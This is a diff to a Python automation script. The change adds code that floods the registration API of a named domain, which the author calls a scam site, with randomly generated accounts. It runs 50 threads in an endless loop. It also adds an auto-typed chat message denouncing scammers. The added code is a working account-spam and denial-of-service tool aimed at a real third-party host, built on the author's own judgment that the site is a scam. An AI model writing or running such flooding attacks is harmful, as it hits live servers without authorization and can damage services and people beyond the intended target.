@@ -1,6 +1,9 @@
 import pyautogui as pg
 import time as t
-import os
+import requests
+import random
+import string
+import threading
 
 def AltTab(): #Ready
     pg.keyDown('alt')
@@ -75,7 +78,52 @@ def ProgramLoop():
         elif result=='ImageNotFoundException: image not found':
             print('Link Not Found ... Scrolling Down')
             pg.scroll(-1)
-        
+
+def ScamSpam():
+    pg.moveTo(2987,1367)
+    pg.click()
+    pg.typewrite("Ladies and gentlmen. Scammers and wannabe hackers. For the sake of your pride and humanity grow a conscience. This is a scam and you all know it. Half of you are bots. The numbers used here will be reported to Whish and will be banned. Seriously get a life. Regards, BlackDog.")
+    pg.press('enter')
+
+def RandomNames():
+    result=''.join(random.choices(string.ascii_letters + string.digits, k=16))
+    return result
+
+def RandomPassword():
+    result=''.join(random.choices(string.ascii_letters + string.digits, k=12))
+    return result
+
+def CreateAccount():
+    accountName=RandomNames()+"@blackdog.com"
+    #print(accountName)
+    accountPassword=RandomPassword()
+   #print(accountPassword)
+    Stuff2Send={
+         "country":"Lebanon (‫لبنان‬‎)",
+         "invite":"632058",
+         "password":accountPassword,
+         "repassword":accountPassword,
+         "username":accountName,
+    }
+    response=requests.post("https://lbn.mtjwapis.in/api/user/register/create",json=Stuff2Send)
+    #print(str(response))
+    if str(response)=="<Response [200]>":
+        print("[+] Account created: "+accountName+" : "+accountPassword)
+    else:
+        print("[-] Server returned error: "+str(response))
+
+def CreateAccountMultiThread():
+    threads=[]
+    for i in range(50):
+        t=threading.Thread(target=CreateAccount)
+        t.daemon = True
+        threads.append(t)
+
+    for i in range(50):
+        threads[i].start()
+
+    for i in range(50):
+        threads[i].join()
 
 if __name__ == "__main__":
     #AltTab()
@@ -83,7 +131,19 @@ if __name__ == "__main__":
     #img=pg.screenshot()
     #img.save('/home/hummus/Desktop/ImageYaBro.png') #Works
     #ClickAndSubmitReview()Works
-    t.sleep(3)
-    ProgramLoop()
-    print(os.getcwd())
-    print('This works')
+    t.sleep(1)
+    print("[+] Scammers of this domain wrote there own grave: lbn.mtjwapis.in")
+    #while True:
+    #ScamSpam()
+
+    ##Single thread with while
+    #while True:
+    #    CreateAccount()
+    
+    ##MultiThreaded Attempt below
+    while True:
+        CreateAccountMultiThread()
+
+    #ProgramLoop()
+    #print(os.getcwd())
+    print('Script Ended.')
